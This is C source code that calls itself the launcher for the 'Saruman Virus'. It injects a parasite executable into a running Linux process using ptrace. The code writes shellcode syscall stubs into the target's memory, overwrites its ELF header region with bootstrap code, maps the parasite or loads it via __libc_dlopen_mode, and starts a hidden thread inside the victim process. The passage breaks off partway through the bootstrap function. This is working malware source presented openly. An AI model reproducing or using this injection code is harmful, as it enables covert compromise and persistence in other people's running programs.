/* * This source code serves as the parasite launcher for
 * the Saruman Virus. 
 * <elfmaster@zoho.com>
 */

#include "saruman.h"
#include <sys/time.h>
#include <sys/wait.h>

#define STACK_TOP(x) (x - STACK_SIZE)
#define __BREAKPOINT__ __asm__ __volatile__("int3"); 
#define __RETURN_VALUE__(x) __asm__ __volatile__("mov %0, %%rax\n" :: "g"(x))

#define MAX_PATH 512
#define TMP_PATH "/tmp/.parasite.elf"


/*
 * Any functions that we inject as shellcode into a process image
 * should have the __PAYLOAD_ATTRIBUTES__, which are defined in
 * saruman.h as __attribute__((align(8), __always_inline__))
 * __PAYLOAD_KEYWORDS__ is defined as static int volatile
 */

 __PAYLOAD_KEYWORDS__ int  create_thread(void (*)(void *), void *, unsigned long) __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ int load_exec(const char *,uint64_t,uint64_t,uint64_t,uint64_t,uint64_t)	 __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *, void *) 		  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ long evil_ptrace(long, long, void *, void *) 		  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ void * evil_mmap(void *, unsigned long, unsigned long, unsigned long, long, unsigned long) __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void *, uint64_t, void *) 	  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ long evil_open(const char *, unsigned long) 		  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ int evil_fstat(long, struct stat *) 			  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ long evil_lseek(long, long, unsigned int)			  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ int evil_read(long, char *, unsigned long)		  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ size_t evil_write(long, void *, unsigned long)		  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ int evil_brk(void *addr)					  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ int evil_mprotect(void *, size_t, int)			  __PAYLOAD_ATTRIBUTES__;
 __PAYLOAD_KEYWORDS__ int SYS_mprotect(void *, size_t, int)			  __PAYLOAD_ATTRIBUTES__;

void dummy_fn(void);
int call_fn(functionPayloads_t func, handle_t *, uint64_t);
void *heapAlloc(size_t);
uint8_t * create_fn_shellcode(void (*)(), size_t);
void prepare_fn_payloads(payloads_t *, handle_t *h);
int map_elf_binary(handle_t *, const char *);
int fixup_got(handle_t *);
struct linking_info *get_reloc_data(handle_t *);
Elf64_Addr resolve_symbol(char *, uint8_t *);
Elf64_Addr get_libc_addr(int);
char * get_section_index(int, uint8_t *);
Elf64_Addr get_sym_from_libc(handle_t *, const char *);

int pt_memset(handle_t *, void *target, size_t len);
int pt_mprotect(handle_t *, void *, size_t, int);
int pt_create_thread(handle_t *h, void (*)(void *), void *, uint64_t);


int pid_detach_direct(pid_t);
void toggle_ptrace_state(handle_t *, int);
int pid_attach(handle_t *);
int pid_detach(handle_t *);
int pid_attach_stateful(handle_t *);
int pid_detach_stateful(handle_t *);

/*
 * We will use these pointers to calculate
 * the size of our functions. I.E bootstrap_code_size = f2 - f1;
 */
void *f1 = bootstrap_code;
void *f2 = dlopen_load_exec;
void *f3 = load_exec;
void *f4 = evil_read;
void *f5 = evil_open;
void *f6 = evil_brk;
void *f7 = evil_mmap;
void *f8 = evil_lseek;
void *f9 = evil_ptrace;
void *f10 = evil_ptrace;
void *f11 = create_thread;
void *f12 = evil_mprotect;
void *f13 = evil_write;
void *f14 = dummy_fn;

struct {
	int no_dlopen;
	int isargs;
} opts;
	
struct arginfo {
	char *args[12];
	int argc;
} arginfo;

void *heapAlloc(size_t len)
{
	uint8_t *chunk = malloc(len);
	if (chunk == NULL) {
		perror("malloc");
		exit(-1);
	}
	return chunk;
}

/*
 * bootstrap_code just creates an anonymous memory
 * mapping large enough to hold the parasite loading
 * code.
 */
#pragma GCC push_options
#pragma GCC optimize ("O0")

__PAYLOAD_KEYWORDS__ uint64_t bootstrap_code(void * vaddr, uint64_t size, void *stack)
{
	volatile void *mem;

	/*
	 * Create a code segment at 0x00C00000 to store load_exec() function
	 * and other parasite preparation and loading code.
	 */
	mem = evil_mmap(vaddr, 
			PAGE_ALIGN_UP(size), 
			PROT_READ|PROT_WRITE|PROT_EXEC, 
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, 
			-1, 0);
	
	 /*
         * Create executable segment for ephemeral storage
         * of code for custom procedure calls done through
         * ptrace. These include syscalls (Such as SYS_mprotect)
         * and other simple functions that we want to execute
         * within the remote process.
         */
        mem = evil_mmap((void *)PT_CALL_REGION,
                        PT_CALL_REGION_SIZE,
                        PROT_READ|PROT_WRITE|PROT_EXEC,
                        MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED,
                        -1, 0);

	/*
	 * Create stack segment that will be used by the parasite
	 * thread.
	 */
	mem = evil_mmap(stack,
			STACK_SIZE,
			PROT_READ|PROT_WRITE,
			MAP_ANONYMOUS|MAP_PRIVATE|MAP_GROWSDOWN,
			-1, 0);
	
	__RETURN_VALUE__(mem);
	//__asm__ __volatile__("mov %0, %%rax\n" :: "g"(mem));

	__BREAKPOINT__;
}

/*
 * A version of load_elf_binary() that works with PIE executables
 * only. 
 */
#define __RTLD_DLOPEN 0x80000000 //glibc internal dlopen flag emulates dlopen behaviour 
__PAYLOAD_KEYWORDS__ void * dlopen_load_exec(const char *path, void *dlopen_addr)
{
	void * (*libc_dlopen_mode)(const char *, int) = dlopen_addr;
	void *handle = (void *)0xfff; //initialized for debugging
	handle = libc_dlopen_mode(path, __RTLD_DLOPEN|RTLD_NOW|RTLD_GLOBAL);
	__RETURN_VALUE__(handle);
	__BREAKPOINT__;
}
/* 
 * A simplified load_elf_binary() function that loads the
 * position independent parasite executable into the remote
 * process address space (But would work with non PIE too)
 */
	
__PAYLOAD_KEYWORDS__ int load_exec(const char *path, 
			           uint64_t textVaddr, 
				   uint64_t dataVaddr, 
				   uint64_t textSize, 
			  	   uint64_t dataSize,
				   uint64_t dataOffset)
{
	uint64_t map_addr, brk_addr;
	uint32_t off;
	uint8_t *data;
	volatile void *m1, *m2;
	volatile int fd;
	
	fd = evil_open(path, O_RDONLY);
	m1 = evil_mmap((void *)_PAGE_ALIGN(textVaddr), 
			PAGE_ROUND(textSize), 
			PROT_READ|PROT_WRITE|PROT_EXEC, 
			MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
			-1, 0);
	
	/*
	 * Read in text segment to m1
	 */	
	evil_read(fd, (uint8_t *)m1, textSize);

	m2 = evil_mmap((void *)_PAGE_ALIGN(dataVaddr),
			PAGE_ROUND(dataSize) + PAGE_SIZE,
			PROT_READ|PROT_WRITE,
			MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS,
			-1, 0);
	
	/*
	 * dataOffset is offset from beginning of file to data segment
	 */
	evil_lseek(fd, dataOffset, SEEK_SET);
	
	/*
	 * off is distance from beginning of page aligned data vaddr to start of data p_vaddr
	 */
	off = dataVaddr - _PAGE_ALIGN(dataVaddr);
	data = (uint8_t *)(uint64_t)(m2 + off);
	/*
	 * Read in data segment to m2
	 */
	evil_read(fd, data, dataSize);
	
	brk_addr = _PAGE_ALIGN(dataVaddr) + dataSize;
	evil_brk((void *)PAGE_ROUND(brk_addr));

	__RETURN_VALUE__(m2);
	__BREAKPOINT__;

}

__PAYLOAD_KEYWORDS__ int evil_read(long fd, char *buf, unsigned long len)
{
         long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $0, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return (int)ret;
}

__PAYLOAD_KEYWORDS__ long evil_open(const char *path, unsigned long flags) 
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov $2, %%rax\n"
                        "syscall" : : "g"(path), "g"(flags));
	
        asm ("mov %%rax, %0" : "=r"(ret));              
        return ret;
}


__PAYLOAD_KEYWORDS__ int evil_brk(void *addr)
{
	long ret;
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov $12, %%rax\n"
			"syscall" : : "g"(addr));
	asm("mov %%rax, %0" : "=r"(ret));
	return (int)ret;
}

	
__PAYLOAD_KEYWORDS__ void * evil_mmap(void *addr, unsigned long len, unsigned long prot, unsigned long flags, long fd, unsigned long off)
{
        long mmap_fd = fd;
        unsigned long mmap_off = off;
        unsigned long mmap_flags = flags;
        unsigned long ret;

        __asm__ volatile(
                         "mov %0, %%rdi\n"
                         "mov %1, %%rsi\n"
                         "mov %2, %%rdx\n"
                         "mov %3, %%r10\n"
                         "mov %4, %%r8\n"
                         "mov %5, %%r9\n"
                         "mov $9, %%rax\n"
                         "syscall\n" : : "g"(addr), "g"(len), "g"(prot), "g"(flags), "g"(mmap_fd), "g"(mmap_off));
        asm ("mov %%rax, %0" : "=r"(ret));              
        return (void *)ret;
}

__PAYLOAD_KEYWORDS__ long evil_lseek(long fd, long offset, unsigned int whence)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $8, %%rax\n"
                        "syscall" : : "g"(fd), "g"(offset), "g"(whence));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;

}

__PAYLOAD_KEYWORDS__ long evil_ptrace(long request, long pid, void *addr, void *data) 

{
        long ret;

        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov %3, %%r10\n"
                        "mov $101, %%rax\n"
                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
        asm("mov %%rax, %0" : "=r"(ret));
        
        return ret;
}

__PAYLOAD_KEYWORDS__ int evil_fstat(long fd, struct stat *buf)
{
	long ret;
	
	__asm__ volatile(
			"mov %0, %%rdi\n"
			"mov %1, %%rsi\n"
			"mov $5, %%rax\n"
			"syscall" : : "g"(fd), "g"(buf));
	asm("mov %%rax, %0" : "=r"(ret));
	
	return ret;
}

__PAYLOAD_KEYWORDS__ int create_thread(void (*fn)(void *), void *data, unsigned long stack)
{
        long retval;
        void **newstack;
   //   unsigned int fnAddr = (unsigned int)(uintptr_t)fn;
    //  fn = (void (*)(void *))((uintptr_t)fnAddr & ~(uint32_t)0x0);
        
        newstack = (void **)stack;
        *--newstack = data;
        
        __asm__ __volatile__(
                "syscall        \n\t"
                "test %0,%0     \n\t"        
                "jne 1f         \n\t"        
                "call *%3       \n\t"       
                "mov %2,%0      \n\t"
                "xor %%r10, %%r10\n\t"
                "xor %%r8, %%r8\n\t"
                "xor %%r9, %%r9 \n\t"
                "int $0x80      \n\t"       
                "1:\t"
                :"=a" (retval)
                :"0" (__NR_clone),"i" (__NR_exit),
                 "g" (fn),
                 "D" (CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND | SIGCHLD),
                 "S" (newstack));

        if (retval < 0) {
                retval = -1;
		__RETURN_VALUE__(retval);
        }
	__BREAKPOINT__;
}

__PAYLOAD_KEYWORDS__ int evil_mprotect(void * addr, unsigned long len, int prot)
{
        volatile unsigned long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $10, %%rax\n"
                        "syscall" : : "g"(addr), "g"(len), "g"(prot));
     
        __asm__ volatile("mov %%rax, %0" : "=r"(ret));
 	
}

__PAYLOAD_KEYWORDS__ int SYS_mprotect(void *addr, unsigned long len, int prot)
{
	int ret = evil_mprotect(addr, len, prot);
	
	__RETURN_VALUE__(ret);
	__BREAKPOINT__;
}


__PAYLOAD_KEYWORDS__ size_t evil_write(long fd, void *buf, unsigned long len)
{
        long ret;
        __asm__ volatile(
                        "mov %0, %%rdi\n"
                        "mov %1, %%rsi\n"
                        "mov %2, %%rdx\n"
                        "mov $1, %%rax\n"
                        "syscall" : : "g"(fd), "g"(buf), "g"(len));
        asm("mov %%rax, %0" : "=r"(ret));
        return ret;
}
#pragma GCC pop_options

/*
 * This function is only here so we can calculate
 * the size of the previous function (create_thread)
 */
void dummy_fn(void)
{
	
}


int waitpid2(pid_t pid, int *status, int options)
{
        pid_t ret;

        do {
                ret = waitpid(pid, status, options);
        } while (ret == -1 && errno == EINTR);

        return ret;
}

void toggle_ptrace_state(handle_t *h, int state)
{
	switch (state) {
		case PT_ATTACHED:
			printf("[+] PT_ATTACHED -> %d\n", h->tasks.pid);
			h->tasks.state &= ~PT_DETACHED;
			h->tasks.state |= PT_ATTACHED;
			break;
		case PT_DETACHED:
			printf("[+] PT_DETACHED -> %d\n", h->tasks.pid);
			h->tasks.state &= ~PT_ATTACHED;
			h->tasks.state |= PT_DETACHED;
			break;
	}
}

int backup_regs_struct(handle_t *h)
{
	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, &h->orig_pt_reg) < 0) {
		perror("PTRACE_GETREGS");
		return -1;
	}
	memcpy((void *)&h->pt_reg, (void *)&h->orig_pt_reg, sizeof(struct user_regs_struct));
	return 0;
}

int restore_regs_struct(handle_t *h)
{
	if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, &h->orig_pt_reg) < 0) {
		perror("PTRACE_SETREGS");
		return -1;
	}
	return 0;
}

int pid_attach_direct(pid_t pid)
{
        int status;

        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
                if (errno) {
                        fprintf(stderr, "ptrace: pid_attach() failed: %s\n", strerror(errno));
                        return -1;
                }
        }
        do {
                if (waitpid2(pid, &status, 0) < 0)
                        goto detach;

                if (!WIFSTOPPED(status))
                        goto detach;

                if (WSTOPSIG(status) == SIGSTOP)
                        break;

                if ( ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status)) == -1 )
                        goto detach;
        } while(1);

	printf("[+] PT_TID_ATTACHED -> %d\n", pid);
        return 0;


detach:
        fprintf(stderr, "pid_attach_direct() -> waitpid(): %s\n", strerror(errno));
        pid_detach_direct(pid);
        return -1;
}

int pid_detach_direct(pid_t pid)
{
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
		if (errno) {
			fprintf(stderr, "ptrace: pid_detach() failed: %s\n", strerror(errno));
			return -1;
		}
	}
	printf("[+] PT_TID_DETACHED -> %d\n", pid);
	return 0;
}

int pid_detach(handle_t *h)
{
	pid_t pid = h->tasks.pid;
	
	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0) {
		if (errno) {
			fprintf(stderr, "ptrace: pid_detach() failed: %s\n", strerror(errno));
			return -1;
		}
	}
	toggle_ptrace_state(h, PT_DETACHED);
	return 0;
}

int pid_detach_stateful(handle_t *h)
{
	if (h->tasks.state & PT_DETACHED)
		return 0;
	if (pid_detach(h) < 0)
		return -1;
}

	
		
int pid_attach(handle_t *h)
{
	int status;
	pid_t pid = h->tasks.pid;
	
        if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
		if (errno) {
                	fprintf(stderr, "ptrace: pid_attach() failed: %s\n", strerror(errno));
                	return -1;
		}
        }
	do {
		if (waitpid2(pid, &status, 0) < 0) 
			goto detach;
		
		if (!WIFSTOPPED(status))
			goto detach;
		
		if (WSTOPSIG(status) == SIGSTOP)
			break;
	
	        if ( ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status)) == -1 )
                        goto detach;
	} while(1);
	
	toggle_ptrace_state(h, PT_ATTACHED);
	return 0;


detach:
	fprintf(stderr, "pid_attach() -> waitpid(): %s\n", strerror(errno));
	pid_detach(h);
	return -1;
}

int pid_attach_stateful(handle_t *h)
{
	if(h->tasks.state & PT_ATTACHED)
		return 0;
	
	if (pid_attach(h) < 0)
		return -1;

}

int pid_read(int pid, void *dst, const void *src, size_t len)
{

        int sz = len / sizeof(void *);
        unsigned char *s = (unsigned char *)src;
        unsigned char *d = (unsigned char *)dst;
        long word;

        while (sz-- != 0) {
                word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL);
                if (word == -1 && errno) {
			fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
                        return -1;
                }
                *(long *)d = word;
                s += sizeof(long);
                d += sizeof(long);
        }
        
        return 0;
}

int pid_write(int pid, void *dest, const void *src, size_t len)
{
        size_t rem = len % sizeof(void *);
        size_t quot = len / sizeof(void *);
        unsigned char *s = (unsigned char *) src;
        unsigned char *d = (unsigned char *) dest;
        
        while (quot-- != 0) {
                if ( ptrace(PTRACE_POKEDATA, pid, d, *(void **)s) == -1 )
                        goto out_error;
                s += sizeof(void *);
                d += sizeof(void *);
        }

        if (rem != 0) {
                long w;
                unsigned char *wp = (unsigned char *)&w;

                w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
                if (w == -1 && errno != 0) {
                        d -= sizeof(void *) - rem;

                        w = ptrace(PTRACE_PEEKDATA, pid, d, NULL);
                        if (w == -1 && errno != 0)
                                goto out_error;

                        wp += sizeof(void *) - rem;
                }

                while (rem-- != 0)
                        wp[rem] = s[rem];

                if (ptrace(PTRACE_POKEDATA, pid, (void *)d, (void *)w) == -1)
                        goto out_error;
        }

        return 0;

out_error:
	fprintf(stderr, "pid_write() failed, pid: %d: %s\n", pid, strerror(errno));
        return -1;
}

/*
 * call_fn() allows one to inject a function
 * (select by functionPayloads_t) into the remote
 * process, and execute it. The return value for
 * the function is stored in payloads.function[func].retval
 */
#define SLACK_SIZE 32
int call_fn(functionPayloads_t func, handle_t *h, uint64_t ip)
{
	int i, status, argc;
	Elf64_Addr entry_point;
	uint8_t *shellcode;
	uint8_t *sc;
	size_t code_size;
	struct user_regs_struct *pt_reg = &h->pt_reg;

	shellcode = h->payloads.function[func].shellcode;
	code_size = h->payloads.function[func].size;
	argc = h->payloads.function[func].argc;
	
	if (pid_attach_stateful(h) < 0) 
		return -1;

	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, pt_reg) < 0)
		return -1;
	
	
	entry_point = ip ? ip : h->payloads.function[func].target;
  	
	/* 
	 * Which payload type?
	 */
	switch(h->payloads.function[func].ptype) {
		case _PT_FUNCTION:
			if (pid_write(h->tasks.pid, (void *)entry_point, (void *)shellcode, code_size) < 0)
				return -1;
			break;	
		
		case _PT_SYSCALL:
			sc = (uint8_t *)alloca(ULONG_ROUND(h->payloads.function[func].size) + 16);
#if DEBUG
			for (i = 0; i < code_size + 8; i++) {
				printf("%02x", shellcode[i]);
				if (i % 32 == 0)
					printf("\n");
			}
#endif
			memcpy(sc, shellcode, code_size);		
			for (i = 0; i < 4; i++)
				sc[code_size + i] = 0xCC;
			code_size += 4;
		 	if (pid_write(h->tasks.pid, (void *)entry_point, (void *)sc, code_size) < 0)
                                return -1;
			break;
	}

		
	pt_reg->rip = entry_point;
	switch(argc) {
		case 1:
			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
			break;
		case 2:
			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
			pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
			break;
		case 3:
			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
			pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
			pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
			break;
		case 4:
		 	pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
                        pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
                        pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
			pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
			break;
		case 5:
			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
                        pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
                        pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
                        pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
			pt_reg->r8 =  (uintptr_t)h->payloads.function[func].args[4];
			break;
		case 6:
			pt_reg->rdi = (uintptr_t)h->payloads.function[func].args[0];
                        pt_reg->rsi = (uintptr_t)h->payloads.function[func].args[1];
                        pt_reg->rdx = (uintptr_t)h->payloads.function[func].args[2];
                        pt_reg->rcx = (uintptr_t)h->payloads.function[func].args[3];
                        pt_reg->r8 =  (uintptr_t)h->payloads.function[func].args[4];
			pt_reg->r9 =  (uintptr_t)h->payloads.function[func].args[5];
			break;
	}
	
	if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, pt_reg) < 0)
		return -1;
	
	if (ptrace(PTRACE_CONT, h->tasks.pid, NULL, NULL) < 0)
		return -1;
	
	waitpid2(h->tasks.pid, &status, 0);
	
	if (WSTOPSIG(status) != SIGTRAP) {
		fprintf(stderr, "[!] No SIGTRAP received, something went wrong. Signal: %d\n", WSTOPSIG(status));
		return -1;
	}

	/* Get return value */
	if (ptrace(PTRACE_GETREGS, h->tasks.pid, NULL, pt_reg) < 0) {
		perror("PTRACE_GETREGS");
		return -1;
	}

	h->payloads.function[func].retval = (pt_reg_t)pt_reg->rax;
	
	
	return 0;

}

int pt_memset(handle_t *h, void *target, size_t len)
{
        size_t i;
        int sz = len / sizeof(void *);
        uint64_t null = 0UL;
        uint8_t *s = (uint8_t *)&null;
        uint8_t *d = (uint8_t *)target;
        int pid = h->tasks.pid;

        while(sz-- != 0) {
                long word = ptrace(PTRACE_POKETEXT, pid, d, s);
                if (word == -1) {
                        fprintf(stderr, "ptrace_memset failed, pid: %d: %s\n", pid, strerror(errno));
                        return -1;
                }
                d += sizeof(long);
        }
        return 0;
}

int pt_mprotect(handle_t *h, void *addr, size_t len, int prot)
{
	struct user_regs_struct pt_reg;

	h->payloads.function[SYS_MPROTECT].args[0] = addr; //addr;
	h->payloads.function[SYS_MPROTECT].args[1] = (void *)(uintptr_t)len;
	h->payloads.function[SYS_MPROTECT].args[2] = (void *)(uintptr_t)prot;
	
	
	if (call_fn(SYS_MPROTECT, h, PT_CALL_REGION) < 0) {
		printf("call_fn(SYS_MPROTECT, ...) failed: %s\n", strerror(errno));
		return -1;
	}
	
	return (int)h->payloads.function[SYS_MPROTECT].retval;
}

int pt_create_thread(handle_t *h, void (*fn)(void *), void *data, uint64_t stack)
{
	struct user_regs_struct pt_reg;
	
	h->payloads.function[CREATE_THREAD].args[0] = (void *)fn;
	h->payloads.function[CREATE_THREAD].args[1] = data;
	h->payloads.function[CREATE_THREAD].args[2] = (void *)(uint64_t)stack;

	if (call_fn(CREATE_THREAD, h, 0) < 0) {
		printf("call_fn(CREATE_THREAD, ...) failed: %s\n", strerror(errno));
		return -1;
	}
	
	printf("retval: %llx\n", h->payloads.function[CREATE_THREAD].retval);
	return (int)h->payloads.function[CREATE_THREAD].retval;
}


static int dlopen_launch_parasite(handle_t *h)
{
	struct user_regs_struct tid_regs;
	int status;
	void (*entry)(void *) = (void *)h->entryp;
	tid_t tid;
	DBG_MSG("[+] Entry point: %p\n", entry);

        if (pid_attach_stateful(h) < 0)
                return -1;

        /*
         * zero out stack segment from 
         */
        pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);

        h->tasks.thread_count = 0;
	
        if ((h->tasks.thread[0] = pt_create_thread(h, entry, NULL, (uintptr_t)h->stack.base)) < 0) {
                printf("[!] pt_create_thread() failed in process %d\n", h->tasks.pid);
                exit(-1);
        }

        tid = h->tasks.thread[0];

        printf("[+] Thread injection succeeded, tid: %d\n", h->tasks.thread[0]);
	printf("[+] Saruman successfully injected program: %s\n", h->path);
	return 0; 
}


static int launch_parasite(handle_t *h)
{
	struct user_regs_struct tid_regs;
	int status;
	void (*entry)(void *) = (void (*)(void *))(h->entryp + h->base);
	tid_t tid;

	DBG_MSG("[+] Entry point: %p\n", entry);

	if (pid_attach_stateful(h) < 0)
		return -1;
	
	/*
	 * zero out stack segment from 
	 */
	pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);
	
	h->tasks.thread_count = 0; 
	
	if ((h->tasks.thread[0] = pt_create_thread(h, entry, NULL, (uintptr_t)h->stack.base)) < 0) {
                printf("[!] pt_create_thread() failed in process %d\n", h->tasks.pid);
                exit(-1);
        }
	
	tid = h->tasks.thread[0];

	printf("[+] Thread injection succeeded, tid: %d\n", h->tasks.thread[0]);

	return 0;
	
}

/*
 * XXX This function was only to test the parasite before
 * thread injection was working (Which it is now)
 */
static int launch_parasite_no_thread(handle_t *h)
{
        struct user_regs_struct pt_reg = {0};
        int status;
        void *stackframe;
	long null = 0L;

        if (pid_attach_stateful(h) < 0)
                return -1;

	pt_memset(h, (void *)STACK_TOP(h->stack.base), STACK_SIZE);
        
	h->pt_reg.rip = (uint64_t)h->entryp + h->base;
        h->pt_reg.rsp = (uint64_t)h->stack.base;
	
        if (ptrace(PTRACE_SETREGS, h->tasks.pid, NULL, &h->pt_reg) < 0) {
                perror("PTRACE_SETREGS");
                return -1;
        }
	
        return 0;
}

int run_exec_loader_dlopen(handle_t *h)
{
	size_t codesize;
        void *mapped;
        struct user_regs_struct pt_reg;
        int i;
        char buf[4096];
        char tmp[32], tmp2[32];
        struct linking_info *linfo = h->linfo;
	void *ascii_storage = (void *)((unsigned long)h->stack.base - 512);

	if (pid_attach_stateful(h) < 0)
		return -1;
	
	if (pid_write(h->tasks.pid, (void *)ascii_storage, (void *)h->path, strlen(h->path) + 16) < 0)
		return -1;

	if (pid_read(h->tasks.pid, (void *)tmp, (void *)ascii_storage, strlen(h->path) + 16) < 0)
		return -1;
	
	DBG_MSG("[DEBUG]-> parasite path: %s\n", tmp);

	h->payloads.function[DLOPEN_EXEC_LOADER].args[0] = (void *)ascii_storage; /* "./parasite" */

	DBG_MSG("[DEBUG]-> address of __libc_dlopen_mode(): %p\n", 
	h->payloads.function[DLOPEN_EXEC_LOADER].args[1]);

	/* NOTE: args[1] is already set to the address of function __libc_dlopen_mode() */

	if (call_fn(DLOPEN_EXEC_LOADER, h, 0) < 0) {
		printf("call_fn(DLOPEN_EXEC_LOADER, ...) failed: %s\n", strerror(errno));
		return -1;
	}
	

	printf("DLOPEN_EXEC_LOADER-> ret val: %llx\n", h->payloads.function[DLOPEN_EXEC_LOADER].retval);
	
	return 0;
}

int run_exec_loader(handle_t *h)
{
	size_t codesize;
	void *mapped;
	struct user_regs_struct pt_reg;
	int i;
	char buf[4096];
	char tmp[32];
	struct linking_info *linfo = h->linfo;
	void *ascii_storage = (void *)((unsigned long)h->stack.base - 512);

	
	if (pid_attach_stateful(h) < 0)
		return -1;
	
	if (pid_write(h->tasks.pid, (void *)ascii_storage, (void *)TMP_PATH, strlen(TMP_PATH) + 16) < 0)
		return -1;
	
	if (pid_read(h->tasks.pid, (void *)tmp, (void *)ascii_storage, strlen(h->path) + 16) < 0)
		return -1;
	
	DBG_MSG("[DEBUG]-> parasite path: %s\n", tmp);
	
	h->payloads.function[EXEC_LOADER].args[0] = (void *)ascii_storage;
	
	if (call_fn(EXEC_LOADER, h, 0) < 0) {
		printf("call_fn(EXEC_LOADER, ...) failed: %s\n", strerror(errno));
		return -1;
	}
	
	printf("ret val: %llx\n", h->payloads.function[EXEC_LOADER].retval);
	/*
	 * XXX We no longer need this code as we handle all of the relocations
	 * and write the fixed up executable to /tmp/parasite.elf file.
	 
	for (i = 0; i < h->linfo[0].count; i++) {
		if(!h->linfo[i].resolved) 
			continue;
		if (pid_write(h->tasks.pid, (void *)(h->dataVaddr + linfo[i].gotOffset), (void *)&linfo[i].resolved, sizeof(void *)))
			return -1;
	}

	*/

	return 0;
}


/*
 * Inject bootstrap code (Which creates a memory mapping for us
   to store our executable loading code)
 */
int run_bootstrap(handle_t *h)
{
	struct user_regs_struct pt_reg, pt_reg_orig;
	char maps[MAX_PATH - 1], line[256], tmp[32];
	char *p, *start;
	uint8_t *origcode;
	FILE *fd;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	uint32_t codesize;
	int i, status, ret;
	
	
	snprintf(maps, MAX_PATH - 1, "/proc/%d/maps", h->tasks.pid);
	
	if ((fd = fopen(maps, "r")) == NULL) {
		fprintf(stderr, "Cannot open %s for reading: %s\n", maps, strerror(errno));
		return -1;
	}
	while (fgets(line, sizeof(line), fd)) {
		
		if ((p = strchr(line, '/')) == NULL)
			continue;
		*(char *)strchr(p, '\n') = '\0';
		h->remote.path = strdup(p);
		h->remote.fd = open(h->remote.path, O_RDONLY);
		if (h->remote.fd < 0) {
			fprintf(stderr, "Canot open %s for reading: %s\n", h->remote.path, strerror(errno));
			return -1;
		}

		for (i = 0, start = tmp, p = line; *p != '-'; i++, p++)
			start[i] = *p;
		start[i] = '\0';
		h->remote.base = strtoul(start, NULL, 16);
		break;
	}	
	
	origcode = (uint8_t *)heapAlloc(codesize = h->payloads.function[BOOTSTRAP_CODE].size);
	h->payloads.function[BOOTSTRAP_CODE].target = h->remote.base;
	
	if (pid_attach_stateful(h) < 0) 
		return -1;
	
	if (pid_read(h->tasks.pid, (void *)origcode, (void *)h->remote.base, codesize) < 0) 
		return -1; 
	
	/*
	 * h->remote.base contains the address of the hosts text segment where
	 * we overwrite the ELF file hdr and phdr's with bootstrap_code()
	 */
	printf("Calling bootstrap code\n");
	if (call_fn(BOOTSTRAP_CODE, h, h->remote.base)) {
		printf("call_fn(BOOTSTRAP_CODE, ...) failed: %s\n", strerror(errno));
		return -1;
	} 
	
	h->stack.base = (void *)h->payloads.function[BOOTSTRAP_CODE].retval + STACK_SIZE;

